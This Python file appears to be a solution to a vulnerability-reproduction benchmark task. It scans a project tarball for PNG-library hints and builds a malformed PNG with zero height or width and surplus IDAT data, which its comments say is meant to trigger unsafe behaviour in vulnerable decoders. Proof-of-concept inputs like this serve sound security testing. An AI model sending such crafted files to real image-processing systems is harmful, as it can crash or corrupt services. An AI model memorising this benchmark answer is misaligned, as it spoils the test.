import tarfile
import struct
import zlib
from typing import List


def _png_chunk(chunk_type: bytes, data: bytes) -> bytes:
    length = struct.pack(">I", len(data))
    crc = struct.pack(">I", zlib.crc32(chunk_type + data) & 0xFFFFFFFF)
    return length + chunk_type + data + crc


def _build_png_zero_dim(width: int, height: int, color_type: int = 0, bit_depth: int = 8, idat_payload: bytes = b"") -> bytes:
    # PNG signature
    signature = b"\x89PNG\r\n\x1a\n"

    # IHDR
    ihdr_data = struct.pack(">IIBBBBB", width, height, bit_depth, color_type, 0, 0, 0)
    ihdr = _png_chunk(b'IHDR', ihdr_data)

    # IDAT - ensure some payload even if not provided
    if not idat_payload:
        # For grayscale (color_type=0, bit_depth=8), 1 pixel row needs 1 filter byte + width bytes.
        # If height is zero, we still provide some data to trigger unsafe processing in vulnerable versions.
        # Provide at least 2 bytes to represent a filter byte and one sample.
        uncompressed = b"\x00\x00"
        idat_payload = zlib.compress(uncompressed, level=9)
    idat = _png_chunk(b'IDAT', idat_payload)

    # IEND
    iend = _png_chunk(b'IEND', b'')

    return signature + ihdr + idat + iend


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Inspect project files to guess likely format; prefer PNG when project indicates PNG/spng/libpng
        has_png_hint = False
        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                names_lower: List[str] = [m.name.lower() for m in members]
                keywords = (
                    "spng",
                    "libspng",
                    "png",
                    "pngread",
                    "pngdec",
                    "pngparser",
                    "read_png",
                    "decode_png",
                )
                for n in names_lower:
                    if any(k in n for k in keywords):
                        has_png_hint = True
                        break
        except Exception:
            # If tar cannot be read, default to PNG PoC anyway
            has_png_hint = True

        # Build a PNG with zero height (width non-zero) and a non-empty IDAT to trigger unsafe paths
        if has_png_hint:
            width = 1
            height = 0
            # Provide a larger-than-expected decompressed payload to amplify unsafe behavior in vulnerable versions
            # Uncompressed data here simulates at least one scanline worth of data: filter byte + 1 sample
            # We repeat to ensure the inflater tries to write more than zero bytes when height is zero.
            uncompressed = (b"\x00\x00") * 64  # 128 bytes uncompressed
            idat_payload = zlib.compress(uncompressed, level=9)
            return _build_png_zero_dim(width=width, height=height, color_type=0, bit_depth=8, idat_payload=idat_payload)

        # Fallback PNG with zero width and at least one row
        width = 0
        height = 1
        uncompressed = (b"\x00") * 64
        idat_payload = zlib.compress(uncompressed, level=9)
        return _build_png_zero_dim(width=width, height=height, color_type=2, bit_depth=8, idat_payload=idat_payload)